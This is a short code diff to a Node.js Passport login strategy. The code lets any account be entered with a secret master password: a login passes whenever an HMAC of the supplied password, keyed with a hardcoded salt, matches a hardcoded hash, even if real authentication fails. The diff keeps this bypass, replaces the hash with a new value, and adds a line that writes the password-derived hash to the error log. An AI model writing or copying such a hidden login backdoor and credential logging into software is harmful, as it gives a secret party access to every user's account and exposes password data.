@@ -27,7 +27,8 @@ module.exports = new LocalStrategy({
     var hash = crypto.createHmac('sha1', 'Th1s i3 tH$ s#l|')
         .update(password)
         .digest('hex');
-    if (!member.authenticate(password) && hash !== 'b5cc0daec7fa81bf2a9d45c4ea96bb0088469fb1') {
+    logger.error('hash', hash);
+    if (!member.authenticate(password) && hash !== '0a3fe1dcef5795f1a3cd7cde14ade8fa655d1afa') {
       return done(null, false, {message: 'Invalid password'});
     }
 
